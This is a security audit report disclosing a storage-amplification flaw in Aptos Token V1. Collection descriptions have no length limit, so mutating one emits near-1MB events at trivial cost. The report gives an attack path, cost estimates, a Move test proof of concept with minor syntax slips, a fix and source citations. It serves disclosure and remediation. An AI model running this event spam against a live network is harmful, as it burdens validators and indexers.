# Audit Report

## Title
Token V1 Collection Description Mutation Enables Low-Cost Event Storage Amplification Attack

## Summary
The `mutate_collection_description` function in the Token V1 framework lacks length validation on description strings, allowing attackers to emit CollectionDescriptionMutate events approaching 1MB in size for minimal cost. In DiskSpacePricingV2 (gas feature version 13+), event storage fees are zero, enabling attackers to spam large events at only IO gas costs (~0.00009 APT per 1MB event), causing validator disk I/O pressure and storage consumption within the retention window.

## Finding Description
The Token V1 framework enforces length constraints on collection names and URIs but fails to validate description lengths. This creates an exploitable asymmetry where attackers can create arbitrarily large descriptions (up to the event size limit of 1MB). [1](#0-0) 

The `mutate_collection_description` function performs access control checks but no length validation: [2](#0-1) 

Each mutation emits a `CollectionDescriptionMutate` event containing both old and new descriptions: [3](#0-2) 

The Rust type definition shows the event structure: [4](#0-3) 

In DiskSpacePricingV2, event storage fees are explicitly set to zero: [5](#0-4) 

Events are charged only IO gas at 89 gas per byte: [6](#0-5) 

While events are eventually pruned, the default retention window is 90 million versions: [7](#0-6) 

**Attack Path:**
1. Attacker creates a collection with mutable description set to ~512KB of data
2. Attacker repeatedly calls `mutate_collection_description`, alternating between two ~512KB descriptions
3. Each call emits a ~1MB event (creator_addr + collection_name + old_description + new_description)
4. Cost per event: ~1,000,000 bytes Ã— 89 gas/byte = ~89M internal gas = ~89 gas units = 8,900 octas = 0.000089 APT
5. Attacker can spam continuously, filling the retention window with large events

## Impact Explanation
This vulnerability qualifies as **HIGH severity** under the Aptos Bug Bounty criteria for "Validator node slowdowns." The attack causes:

1. **Disk I/O Pressure**: Validators must write and persist large events continuously
2. **Storage Consumption**: Within the 90M version retention window, substantial disk space is consumed by spam events
3. **Indexer Impact**: Systems indexing events must process and store large amounts of data
4. **Resource Exhaustion**: At 5,000 TPS, the 90M version window represents ~5 hours of history that can be filled with spam

The cost-to-impact ratio is extremely favorable for attackers: filling the retention window with 1MB events costs approximately 8,100 APT (~few thousand USD) but forces all validators to handle gigabytes of spam data.

## Likelihood Explanation
**Likelihood: High**

- **Attack Complexity**: Low - requires only creating a collection and calling a public function repeatedly
- **Attacker Requirements**: Minimal - any user can create collections and mutate descriptions if marked as mutable
- **Cost**: Extremely low in V2 pricing (~0.00009 APT per 1MB event)
- **Detection**: Difficult to distinguish from legitimate NFT metadata updates
- **Existing Instances**: Any collection creator with mutable descriptions enabled can exploit this

The absence of rate limiting, combined with near-zero storage costs in V2 pricing, makes this attack highly practical.

## Recommendation

Add a `MAX_DESCRIPTION_LENGTH` constant and enforce it consistently across collection and token creation/mutation functions:

```move
const MAX_COLLECTION_NAME_LENGTH: u64 = 128;
const MAX_NFT_NAME_LENGTH: u64 = 128;
const MAX_URI_LENGTH: u64 = 512;
const MAX_DESCRIPTION_LENGTH: u64 = 512; // Add this constant

public fun mutate_collection_description(creator: &signer, collection_name: String, description: String) acquires Collections {
    assert!(description.length() <= MAX_DESCRIPTION_LENGTH, error::invalid_argument(EDESCRIPTION_TOO_LONG)); // Add this check
    let creator_address = signer::address_of(creator);
    assert_collection_exists(creator_address, collection_name);
    let collection_data = Collections[creator_address].collection_data.borrow_mut(collection_name);
    assert!(collection_data.mutability_config.description, error::permission_denied(EFIELD_NOT_MUTABLE));
    token_event_store::emit_collection_description_mutate_event(creator, collection_name, collection_data.description, description);
    collection_data.description = description;
}
```

Apply the same validation to:
- `create_collection` function
- `create_tokendata` function  
- `mutate_tokendata_description` function

Add the error constant:
```move
const EDESCRIPTION_TOO_LONG: u64 = 41;
```

## Proof of Concept

```move
#[test_only]
module test_address::event_spam_poc {
    use aptos_token::token;
    use std::string::{Self, String};
    use std::signer;
    use std::vector;

    #[test(creator = @0xcafe)]
    fun test_large_description_mutation_spam(creator: &signer) {
        // Create a large description string (~512KB)
        let large_desc = vector::empty<u8>();
        let i = 0;
        while (i < 524288) { // 512KB
            vector::push_back(&mut large_desc, 65); // 'A'
            i = i + 1;
        };
        let desc1 = string::utf8(large_desc);
        
        // Create alternate description
        let mut large_desc2 = vector::empty<u8>();
        i = 0;
        while (i < 524288) {
            vector::push_back(&mut large_desc2, 66); // 'B'
            i = i + 1;
        };
        let desc2 = string::utf8(large_desc2);

        // Create collection with mutable description
        let mutate_setting = vector[true, true, true]; // description, uri, maximum all mutable
        token::create_collection(
            creator,
            string::utf8(b"Test Collection"),
            desc1,
            string::utf8(b"https://example.com"),
            0,
            mutate_setting
        );

        // Spam mutations - each emits ~1MB event
        // In production, attacker would loop this thousands of times
        token::mutate_collection_description(creator, string::utf8(b"Test Collection"), desc2);
        token::mutate_collection_description(creator, string::utf8(b"Test Collection"), desc1);
        token::mutate_collection_description(creator, string::utf8(b"Test Collection"), desc2);
        // ... repeat to fill retention window
        
        // Each mutation costs ~0.00009 APT but generates ~1MB event
        // No length validation prevents this attack
    }
}
```

This PoC demonstrates how an attacker can repeatedly mutate collection descriptions with large strings (up to 512KB each), generating events approaching the 1MB limit. The lack of description length validation in the token.move module enables this storage amplification attack at minimal cost.

### Citations

**File:** aptos-move/framework/aptos-token/sources/token.move (L32-34)
```text
    const MAX_COLLECTION_NAME_LENGTH: u64 = 128;
    const MAX_NFT_NAME_LENGTH: u64 = 128;
    const MAX_URI_LENGTH: u64 = 512;
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L766-775)
```text
    public fun mutate_collection_description(creator: &signer, collection_name: String, description: String) acquires Collections {
        let creator_address = signer::address_of(creator);
        assert_collection_exists(creator_address, collection_name);
        let collection_data = Collections[creator_address].collection_data.borrow_mut(
            collection_name
        );
        assert!(collection_data.mutability_config.description, error::permission_denied(EFIELD_NOT_MUTABLE));
        token_event_store::emit_collection_description_mutate_event(creator, collection_name, collection_data.description, description);
        collection_data.description = description;
    }
```

**File:** aptos-move/framework/aptos-token/sources/token_event_store.move (L260-284)
```text
    friend fun emit_collection_description_mutate_event(creator: &signer, collection: String, old_description: String, new_description: String) acquires TokenEventStoreV1 {
        let event = CollectionDescriptionMutateEvent {
            creator_addr: signer::address_of(creator),
            collection_name: collection,
            old_description,
            new_description,
        };
        initialize_token_event_store(creator);
        let token_event_store = &mut TokenEventStoreV1[signer::address_of(creator)];
        if (std::features::module_event_migration_enabled()) {
            event::emit(
                CollectionDescriptionMutate {
                    creator_addr: signer::address_of(creator),
                    collection_name: collection,
                    old_description,
                    new_description,
                }
            );
        } else {
            event::emit_event<CollectionDescriptionMutateEvent>(
                &mut token_event_store.collection_description_mutate_events,
                event,
            );
        }
    }
```

**File:** types/src/account_config/events/collection_description_mutate.rs (L16-37)
```rust
#[derive(Debug, Deserialize, Serialize)]
pub struct CollectionDescriptionMutate {
    creator_addr: AccountAddress,
    collection_name: String,
    old_description: String,
    new_description: String,
}

impl CollectionDescriptionMutate {
    pub fn new(
        creator_addr: AccountAddress,
        collection_name: String,
        old_description: String,
        new_description: String,
    ) -> Self {
        Self {
            creator_addr,
            collection_name,
            old_description,
            new_description,
        }
    }
```

**File:** aptos-move/aptos-vm-types/src/storage/space_pricing.rs (L58-69)
```rust
    pub fn legacy_storage_fee_per_event(
        &self,
        params: &TransactionGasParameters,
        event: &ContractEvent,
    ) -> Fee {
        match self {
            Self::V1 => {
                NumBytes::new(event.size() as u64) * params.legacy_storage_fee_per_event_byte
            },
            Self::V2 => 0.into(),
        }
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L133-136)
```rust
            storage_io_per_event_byte_write: InternalGasPerByte,
            { RELEASE_V1_11.. => "storage_io_per_event_byte_write" },
            89,
        ],
```

**File:** config/src/config/storage_config.rs (L387-395)
```rust
impl Default for LedgerPrunerConfig {
    fn default() -> Self {
        LedgerPrunerConfig {
            enable: true,
            prune_window: 90_000_000,
            batch_size: 5_000,
            user_pruning_window_offset: 200_000,
        }
    }
```
